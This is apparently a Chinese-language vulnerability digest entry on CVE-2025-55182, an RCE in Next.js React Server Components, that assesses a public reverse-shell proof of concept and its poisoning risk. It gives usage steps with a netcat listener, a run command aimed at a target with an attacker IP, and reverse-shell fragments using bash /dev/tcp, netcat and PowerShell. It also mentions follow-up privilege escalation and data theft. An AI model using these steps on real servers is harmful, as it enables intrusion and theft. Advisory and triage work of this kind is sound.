## CVE-2025-55182 - Next.js, React, React Server Components (RSC) 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-55182

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Next.js, React, React Server Components (RSC)

**危害等级:** 高危/临界 (Critical)

**CVSS评分:** 9.8

**影响版本:** Next.js 15.x, 16.x (未打补丁版本); React 19 (推测)

**利用条件:** 无需认证，可通过网络直接访问目标服务器

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

CVE-2025-55182是一个影响Next.js和React Server Components（RSC）的未认证远程代码执行（RCE）漏洞，特别针对Next.js 15.x和16.x版本。该漏洞因其极高的危害性，被业界形容为“史诗级”、“战略核导弹”或“核弹级”漏洞，具备广泛的全球影响能力。

**POC有效性分析**
所提供的POC脚本`CVE-2025-55182-revshell.py`是一个功能完备、高度有效的Python工具，旨在利用CVE-2025-55182漏洞，在受影响的目标服务器上建立一个即时反向Shell。该POC利用了Next.js特定路径`/_next/static/chunks/react-flight`的漏洞，通过发送一个精心构造的`multipart/form-data` POST请求来注入恶意的RSC“Function”对象。这个注入的Function对象内含一段JavaScript代码，该代码利用Node.js的`child_process`模块来执行任意系统命令。脚本的实现考虑了不同操作系统的目标环境，集成了三种主流的反向Shell payload：针对Linux的Bash Shell、作为备用方案的Netcat Shell，以及专为Windows Azure或其他Windows主机设计的PowerShell Shell。这种多payload策略显著提升了POC在复杂环境下的成功率和覆盖范围。脚本的命令行接口清晰，只需提供目标URL和攻击者监听器的IP:PORT即可运行，并且其在执行过程中会清晰地输出各阶段的状态信息，包括payload的发送情况和服务器响应状态码，使得操作过程透明且易于验证。多个公开的GitHub项目也提供了类似的POC和复现指南，进一步证实了该漏洞的真实性和可利用性。

**利用步骤**
1. **启动监听器**: 在攻击者的攻击机上，使用`netcat`等工具启动一个监听器，等待反向Shell连接。例如，若攻击者IP为`10.10.14.66`，监听端口为`4444`，则执行命令`nc -lvnp 4444`。
2. **执行POC脚本**: 运行`CVE-2025-55182-revshell.py`脚本，并提供目标Next.js应用程序的URL以及监听器的IP和端口。例如：`python3 CVE-2025-55182-revshell.py https://vuln.example.com 10.10.14.66:4444`。
3. **Payload投递**: 脚本将自动向目标URL发送包含不同反向Shell命令的构造请求。这些请求会尝试在目标服务器上执行Bash、Netcat或PowerShell反向Shell。
4. **获取反向Shell**: 如果目标是脆弱的，其中一个payload将会成功执行，并在攻击者预设的监听器上建立一个反向Shell连接。此时，攻击者将获得目标服务器的命令行访问权限。
5. **验证与后续操作**: 攻击者可以通过执行如`whoami`、`ls`、`id`等命令来验证Shell的有效性，并根据需要进一步执行提权、数据窃取或其他恶意操作。

**投毒风险分析**
对提供的POC代码`CVE-2025-55182-revshell.py`进行投毒风险评估后，我们认为其投毒风险非常低，定为5%。该判断基于以下详细分析：

1. **代码透明度与可读性**: 脚本采用Python编写，代码结构清晰，易于阅读和理解。关键逻辑，如HTTP请求的构造、payload的定义和发送机制，都以直观的方式呈现，且包含明确的注释，指明了代码来源和功能。这使得安全分析人员能够迅速审计代码，识别任何潜在的恶意或可疑行为。

2. **库依赖分析**: 脚本主要依赖于Python的标准库（`sys`, `time`）和广受欢迎的第三方库`requests`。这些库都是行业标准且经过广泛验证的，不涉及冷门、不可信或已知存在漏洞的库。脚本没有从外部未知源下载或加载任何额外的可执行文件或脚本，从而避免了供应链投毒的常见途径。

3. **功能性与预期行为**: 该POC的明确目标是利用CVE-2025-55182漏洞，在目标系统上实现远程代码执行并通过反向Shell获得控制权。脚本中包含的反向Shell命令是其核心功能，用于演示漏洞的实际危害。这些命令（如`bash -i >& /dev/tcp/...`，`nc ...`，`powershell ...`）是标准的攻击载荷，它们旨在对目标系统造成影响，而不是POC代码本身携带的隐藏恶意功能。作为防御性安全研究，区分攻击工具的预期功能和工具自身的恶意代码至关重要。在此案例中，POC完全按照其声明的功能运行。

4. **网络行为分析**: 脚本的网络通信行为是可预测和受控的。它仅向用户指定的目标URL发送HTTP POST请求，并在攻击者指定的监听IP和端口上尝试建立反向Shell连接。代码中没有发现任何向其他未声明的第三方服务器发送数据、泄露敏感信息或执行秘密回调的迹象。

5. **文件系统与系统调用**: 脚本自身在执行过程中不进行任何可疑的文件系统操作，例如未经授权的文件创建、删除或修改。在反向Shell的payload中，可能会有在目标系统上创建临时文件（如`mkfifo /tmp/f`）的操作，但这属于远程代码执行的预期载荷行为，并非POC脚本自身的投毒行为。

**结论**: 综上所述，`CVE-2025-55182-revshell.py`是一个设计合理、透明且专注于漏洞利用的合法安全研究工具。它不含任何后门、信息窃取模块、混淆代码或任何超出其明确用途的恶意功能。因此，在受控环境中进行漏洞复现或安全测试时，其被投毒的风险极低。

**项目地址:** https://github.com/Ashwesker/Blackash-CVE-2025-55182

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-55182
